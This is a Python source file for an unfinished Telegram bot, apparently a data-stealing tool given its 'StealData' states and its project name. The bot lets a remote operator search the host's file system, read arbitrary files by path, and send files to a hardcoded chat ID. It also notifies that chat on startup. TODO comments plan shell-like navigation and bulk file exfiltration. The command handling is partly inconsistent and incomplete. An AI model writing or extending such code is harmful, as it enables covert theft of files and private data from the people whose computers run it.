import aiogram
from aiogram import Dispatcher, Bot
from BotForStill.config import TOKEN
from aiogram.filters import Command, CommandStart
import asyncio
from aiogram.types import Message
from pyexpat.errors import messages
from aiogram.exceptions import TelegramBadRequest
from BotForStill.utils import search_one_word, read_file_fu
from aiogram import F
from aiogram.types import FSInputFile
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext



bot = Bot(TOKEN)
dp = Dispatcher()
CHAT_ID = "964584467"

class StealData(StatesGroup):
    waiting_for_action = State()
    waiting_for_word = State()
    reading_file = State()


@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    print(message.chat.id)
    await state.set_state(StealData.waiting_for_action)
    await message.answer("Введите команду")

@dp.message(StealData.waiting_for_action)
async def action(message: Message, state: FSMContext):
    
    user_command = message.text.lower()
    
    valid_comands = ['/find_many', '/read', '/send']
    
    if user_command in valid_comands:
        await message.answer(f"Выполняю команду: {user_command}")
        if user_command == "/read":
            await message.answer("Напишите путь до файла: ")
            await state.set_state(StealData.reading_file)  #дописать обработчки FSM
    if user_command not in ['/find', '/read', '/send']:
        await message.answer("❌ Неправильная команда!")
        await message.answer("Доступные команды: /find, /read, /send")
        return

@dp.message(Command('find_one'))
async def com_search(message: Message, state: FSMContext):
    await message.answer("Введите, что хотите найти")
    await state.set_state(StealData.waiting_for_word)


@dp.message(StealData.waiting_for_word)
async def handle_text(message: Message):
    user_text = (message.text).split()
    search_word = [user_text[0]] if user_text else []
    founded_files, other_dirs, other_files  = search_one_word(search_word)
    
    if founded_files:
        result_founded_str = "\n".join(founded_files)
        result_other_str = "\n".join(other_files)
        try:
            await message.answer("Искомый файл: ")
            await message.answer(result_founded_str)
            await message.answer("Остальные файлы в этой папке: ")
            await message.answer(result_other_str)
        except TelegramBadRequest as e:
            if "message is too long" in str(e):
                await message.answer(f"Найдено {len(other_files)} файлов, но список слишком длинный для отправки")
                await message.answer("Первые 5 файлов:")
                short_list = "\n".join(other_files[:5])
                await message.answer(short_list)
            else:
                await message.answer("Ошибка отправки сообщения")
    else:
        await message.answer("Файлы не найдены")
    
    # await bot.send_message(chat_id=CHAT_ID, text = result_str)
@dp.message(Command('find_many'))
async def com_search(message: Message):
    await message.answer("Введите, что хотите найти")

# @dp.message(Command('read'))
# async def reading_file(message: Message, state: FSMContext):
#     await message.answer("Напишите путь до файла: ")
#     await state.set_state(StealData.reading_file)



@dp.message(StealData.reading_file)
async def read_file(message: Message):
    path_from_user = message.text
    result = read_file_fu(path_from_user)
    await message.answer(result)


@dp.message(Command('send'))
async def send_file(message: Message):
    file_path = r"C:\PythonVSCODE\venv\BotForStill\utils.py"
    try:
        document = FSInputFile(file_path)
        await bot.send_document(chat_id=CHAT_ID, document=document, 
                            caption=f"Файл: {file_path}")
    except FileNotFoundError:
        await message.answer("Файл не найден")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

async def main():
    await bot.send_message(chat_id=CHAT_ID, text = "Bot was started")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"Произошла ошибка {e}")


#Написать фунции
    #1)Прочтение содержимого файла
    #2)Выгрузка файла

#Сделать FSM для обработки сценариев:
    #ls, pwd, cd
    #Если файл слишком больщой выгружать 

#Сделать выгрузку файлов
    
    #2)Сделать через FSM сценарии и обработки событий
    